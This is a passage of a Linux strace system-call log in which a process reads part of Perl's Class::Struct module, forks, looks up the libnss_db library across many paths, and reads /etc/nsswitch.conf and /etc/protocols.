$pre\\$r->$elem$sel$pst;\\n\";\n            $out .= \"  }\\n\";\n        }\n    }\n    $out .= \"}\\n1;\\n\";\n\n    print $out if $print;\n    my $result = eval $out;\n    carp $@ if $@;\n}\n\nsub _usage_error {\n    confess \"struct usage error\";\n}\n\nsub _subclass_error {\n    croak \'struct class cannot be a subclass (@ISA not allowed)\';\n}\n\n1; # for require\n\n\n__END__\n\n=head1 NAME\n\nClass::Struct - declare struct-like datatypes as Perl classes\n\n=head1 SYNOPSIS\n\n    use Class::Struct;\n            # declare struct, based on array:\n    struct( CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ]);\n            # declare struct, based on hash:\n    struct( CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... });\n\n    package CLASS_NAME;\n    use Class::Struct;\n            # declare struct, based on array, implicit class name:\n    struct( ELEMENT_NAME => ELEMENT_TYPE, ... );\n\n    # Declare struct at compile time\n    use Class::Struct CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ];\n    use Class::Struct CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... };\n\n    # declare struct at compile time, based on array, implicit class name:\n    package CLASS_NAME;\n    use Class::Struct ELEMENT_NAME => ELEMENT_TYPE, ... ;\n\n    package Myobj;\n    use Class::Struct;\n            # declare struct with four types of elements:\n    struct( s => \'$\', a => \'@\', h => \'%\', c => \'My_Other_Class\' );\n\n    $obj = new Myobj;               # constructor\n\n                                    # scalar type accessor:\n    $element_value = $obj->s;           # element value\n    $obj->s(\'new value\');               # assign to element\n\n                             ", 4096) = 4096
5498  07:09:19.853488 _llseek(12, 6916, [6916], SEEK_SET) = 0
5498  07:09:19.853523 _llseek(12, 0, [6916], SEEK_CUR) = 0
5498  07:09:19.853534 close(12)         = 0
5498  07:09:19.853711 _llseek(11, 1334, [1334], SEEK_SET) = 0
5498  07:09:19.853727 _llseek(11, 0, [1334], SEEK_CUR) = 0
5498  07:09:19.853737 close(11)         = 0
5498  07:09:19.854382 brk(0x82ff000)    = 0x82ff000
5498  07:09:19.854574 _llseek(10, 2689, [2689], SEEK_SET) = 0
5498  07:09:19.854591 _llseek(10, 0, [2689], SEEK_CUR) = 0
5498  07:09:19.854601 close(10)         = 0
5498  07:09:19.854752 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7dad908) = 5499
5499  07:09:19.854836 getppid()         = 5498
5499  07:09:19.855300 open("/etc/nsswitch.conf", O_RDONLY) = 10
5499  07:09:19.855323 fstat64(10, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
5499  07:09:19.855342 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f73000
5499  07:09:19.855356 read(10, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
5499  07:09:19.855414 read(10, "", 4096) = 0
5499  07:09:19.855426 close(10)         = 0
5499  07:09:19.855462 munmap(0xb7f73000, 4096) = 0
5499  07:09:19.855506 open("/etc/ld.so.cache", O_RDONLY) = 10
5499  07:09:19.855519 fstat64(10, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
5499  07:09:19.855536 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 10, 0) = 0xb7d7a000
5499  07:09:19.855548 close(10)         = 0
5499  07:09:19.855559 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5499  07:09:19.855576 open("/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.855590 stat64("/lib/tls/i686/sse2/cmov", 0xbf9c265c) = -1 ENOENT (No such file or directory)
5499  07:09:19.855604 open("/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.855617 stat64("/lib/tls/i686/sse2", 0xbf9c265c) = -1 ENOENT (No such file or directory)
5499  07:09:19.855628 open("/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.855641 stat64("/lib/tls/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
5499  07:09:19.855659 open("/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.855671 stat64("/lib/tls/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
5499  07:09:19.855688 open("/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.855700 stat64("/lib/tls/sse2/cmov", 0xbf9c265c) = -1 ENOENT (No such file or directory)
5499  07:09:19.855711 open("/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.855723 stat64("/lib/tls/sse2", 0xbf9c265c) = -1 ENOENT (No such file or directory)
5499  07:09:19.855733 open("/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.855745 stat64("/lib/tls/cmov", 0xbf9c265c) = -1 ENOENT (No such file or directory)
5499  07:09:19.855756 open("/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.855768 stat64("/lib/tls", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
5499  07:09:19.855784 open("/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.855796 stat64("/lib/i686/sse2/cmov", 0xbf9c265c) = -1 ENOENT (No such file or directory)
5499  07:09:19.855812 open("/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.855824 stat64("/lib/i686/sse2", 0xbf9c265c) = -1 ENOENT (No such file or directory)
5499  07:09:19.855835 open("/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.855847 stat64("/lib/i686/cmov", 0xbf9c265c) = -1 ENOENT (No such file or directory)
5499  07:09:19.855857 open("/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.855869 stat64("/lib/i686", 0xbf9c265c) = -1 ENOENT (No such file or directory)
5499  07:09:19.855879 open("/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.855891 stat64("/lib/sse2/cmov", 0xbf9c265c) = -1 ENOENT (No such file or directory)
5499  07:09:19.855910 open("/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.855924 stat64("/lib/sse2", 0xbf9c265c) = -1 ENOENT (No such file or directory)
5499  07:09:19.855960 open("/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.855972 stat64("/lib/cmov", 0xbf9c265c) = -1 ENOENT (No such file or directory)
5499  07:09:19.856000 open("/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.856028 stat64("/lib", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
5499  07:09:19.856044 open("/usr/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.856057 stat64("/usr/lib/tls/i686/sse2/cmov", 0xbf9c265c) = -1 ENOENT (No such file or directory)
5499  07:09:19.856069 open("/usr/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.856081 stat64("/usr/lib/tls/i686/sse2", 0xbf9c265c) = -1 ENOENT (No such file or directory)
5499  07:09:19.856092 open("/usr/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.856105 stat64("/usr/lib/tls/i686/cmov", 0xbf9c265c) = -1 ENOENT (No such file or directory)
5499  07:09:19.856116 open("/usr/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.856128 stat64("/usr/lib/tls/i686", 0xbf9c265c) = -1 ENOENT (No such file or directory)
5499  07:09:19.856139 open("/usr/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.856151 stat64("/usr/lib/tls/sse2/cmov", 0xbf9c265c) = -1 ENOENT (No such file or directory)
5499  07:09:19.856163 open("/usr/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.856175 stat64("/usr/lib/tls/sse2", 0xbf9c265c) = -1 ENOENT (No such file or directory)
5499  07:09:19.856186 open("/usr/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.856198 stat64("/usr/lib/tls/cmov", 0xbf9c265c) = -1 ENOENT (No such file or directory)
5499  07:09:19.856209 open("/usr/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.856220 stat64("/usr/lib/tls", 0xbf9c265c) = -1 ENOENT (No such file or directory)
5499  07:09:19.856231 open("/usr/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.856244 stat64("/usr/lib/i686/sse2/cmov", 0xbf9c265c) = -1 ENOENT (No such file or directory)
5499  07:09:19.856255 open("/usr/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.856267 stat64("/usr/lib/i686/sse2", 0xbf9c265c) = -1 ENOENT (No such file or directory)
5499  07:09:19.856278 open("/usr/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.856291 stat64("/usr/lib/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
5499  07:09:19.856308 open("/usr/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.856320 stat64("/usr/lib/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
5499  07:09:19.856340 open("/usr/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.856353 stat64("/usr/lib/sse2/cmov", 0xbf9c265c) = -1 ENOENT (No such file or directory)
5499  07:09:19.856364 open("/usr/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.856376 stat64("/usr/lib/sse2", 0xbf9c265c) = -1 ENOENT (No such file or directory)
5499  07:09:19.856386 open("/usr/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.856405 stat64("/usr/lib/cmov", 0xbf9c265c) = -1 ENOENT (No such file or directory)
5499  07:09:19.856419 open("/usr/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.856458 stat64("/usr/lib", {st_mode=S_IFDIR|0755, st_size=32768, ...}) = 0
5499  07:09:19.856492 open("/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.856523 stat64("/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbf9c265c) = -1 ENOENT (No such file or directory)
5499  07:09:19.856536 open("/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.856549 stat64("/lib/i486-linux-gnu/tls/i686/sse2", 0xbf9c265c) = -1 ENOENT (No such file or directory)
5499  07:09:19.856561 open("/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.856574 stat64("/lib/i486-linux-gnu/tls/i686/cmov", 0xbf9c265c) = -1 ENOENT (No such file or directory)
5499  07:09:19.856586 open("/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.856599 stat64("/lib/i486-linux-gnu/tls/i686", 0xbf9c265c) = -1 ENOENT (No such file or directory)
5499  07:09:19.856610 open("/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.856623 stat64("/lib/i486-linux-gnu/tls/sse2/cmov", 0xbf9c265c) = -1 ENOENT (No such file or directory)
5499  07:09:19.856635 open("/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.856648 stat64("/lib/i486-linux-gnu/tls/sse2", 0xbf9c265c) = -1 ENOENT (No such file or directory)
5499  07:09:19.856660 open("/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.856672 stat64("/lib/i486-linux-gnu/tls/cmov", 0xbf9c265c) = -1 ENOENT (No such file or directory)
5499  07:09:19.856684 open("/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.856696 stat64("/lib/i486-linux-gnu/tls", 0xbf9c265c) = -1 ENOENT (No such file or directory)
5499  07:09:19.856708 open("/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.856721 stat64("/lib/i486-linux-gnu/i686/sse2/cmov", 0xbf9c265c) = -1 ENOENT (No such file or directory)
5499  07:09:19.856734 open("/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.856746 stat64("/lib/i486-linux-gnu/i686/sse2", 0xbf9c265c) = -1 ENOENT (No such file or directory)
5499  07:09:19.856758 open("/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.856771 stat64("/lib/i486-linux-gnu/i686/cmov", 0xbf9c265c) = -1 ENOENT (No such file or directory)
5499  07:09:19.856783 open("/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.856795 stat64("/lib/i486-linux-gnu/i686", 0xbf9c265c) = -1 ENOENT (No such file or directory)
5499  07:09:19.856807 open("/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.856819 stat64("/lib/i486-linux-gnu/sse2/cmov", 0xbf9c265c) = -1 ENOENT (No such file or directory)
5499  07:09:19.856831 open("/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.856846 stat64("/lib/i486-linux-gnu/sse2", 0xbf9c265c) = -1 ENOENT (No such file or directory)
5499  07:09:19.856858 open("/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.856871 stat64("/lib/i486-linux-gnu/cmov", 0xbf9c265c) = -1 ENOENT (No such file or directory)
5499  07:09:19.856882 open("/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.856895 stat64("/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
5499  07:09:19.856942 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.856956 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbf9c265c) = -1 ENOENT (No such file or directory)
5499  07:09:19.856983 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.856997 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2", 0xbf9c265c) = -1 ENOENT (No such file or directory)
5499  07:09:19.857009 open("/usr/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.857023 stat64("/usr/lib/i486-linux-gnu/tls/i686/cmov", 0xbf9c265c) = -1 ENOENT (No such file or directory)
5499  07:09:19.857035 open("/usr/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.857048 stat64("/usr/lib/i486-linux-gnu/tls/i686", 0xbf9c265c) = -1 ENOENT (No such file or directory)
5499  07:09:19.857060 open("/usr/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.857073 stat64("/usr/lib/i486-linux-gnu/tls/sse2/cmov", 0xbf9c265c) = -1 ENOENT (No such file or directory)
5499  07:09:19.857086 open("/usr/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.857099 stat64("/usr/lib/i486-linux-gnu/tls/sse2", 0xbf9c265c) = -1 ENOENT (No such file or directory)
5499  07:09:19.857111 open("/usr/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.857124 stat64("/usr/lib/i486-linux-gnu/tls/cmov", 0xbf9c265c) = -1 ENOENT (No such file or directory)
5499  07:09:19.857136 open("/usr/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.857148 stat64("/usr/lib/i486-linux-gnu/tls", 0xbf9c265c) = -1 ENOENT (No such file or directory)
5499  07:09:19.857160 open("/usr/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.857174 stat64("/usr/lib/i486-linux-gnu/i686/sse2/cmov", 0xbf9c265c) = -1 ENOENT (No such file or directory)
5499  07:09:19.857186 open("/usr/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.857199 stat64("/usr/lib/i486-linux-gnu/i686/sse2", 0xbf9c265c) = -1 ENOENT (No such file or directory)
5499  07:09:19.857211 open("/usr/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.857225 stat64("/usr/lib/i486-linux-gnu/i686/cmov", 0xbf9c265c) = -1 ENOENT (No such file or directory)
5499  07:09:19.857237 open("/usr/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.857249 stat64("/usr/lib/i486-linux-gnu/i686", 0xbf9c265c) = -1 ENOENT (No such file or directory)
5499  07:09:19.857261 open("/usr/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.857274 stat64("/usr/lib/i486-linux-gnu/sse2/cmov", 0xbf9c265c) = -1 ENOENT (No such file or directory)
5499  07:09:19.857286 open("/usr/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.857299 stat64("/usr/lib/i486-linux-gnu/sse2", 0xbf9c265c) = -1 ENOENT (No such file or directory)
5499  07:09:19.857311 open("/usr/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.857326 stat64("/usr/lib/i486-linux-gnu/cmov", 0xbf9c265c) = -1 ENOENT (No such file or directory)
5499  07:09:19.857338 open("/usr/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5499  07:09:19.857351 stat64("/usr/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
5499  07:09:19.857370 munmap(0xb7d7a000, 29913) = 0
5499  07:09:19.857390 open("/etc/ld.so.cache", O_RDONLY) = 10
5499  07:09:19.857395 fstat64(10, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
5499  07:09:19.857395 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 10, 0) = 0xb7d7a000
5499  07:09:19.857395 close(10)         = 0
5499  07:09:19.857396 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5499  07:09:19.857396 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 10
5499  07:09:19.857396 read(10, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
5499  07:09:19.857396 fstat64(10, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
5499  07:09:19.857415 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 10, 0) = 0xb7d6f000
5499  07:09:19.857427 mmap2(0xb7d78000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 10, 0x8) = 0xb7d78000
5499  07:09:19.857444 close(10)         = 0
5499  07:09:19.857467 munmap(0xb7d7a000, 29913) = 0
5499  07:09:19.857484 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 10
5499  07:09:19.857500 fcntl64(10, F_GETFD) = 0x1 (flags FD_CLOEXEC)
5499  07:09:19.857515 fstat64(10, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
5499  07:09:19.857532 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d81000
5499  07:09:19.857543 read(10, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
5499  07:09:19.857784 close(10)         = 0
5499  07:09:19.857796 munmap(0xb7d81000, 4096) = 0
5499  07:09:19.857814 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 10
5499  07:09:19.857828 fstat64(10, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
5499  07:09:19.857844 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d81000
5499  07:09:19.857855 read(10, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF 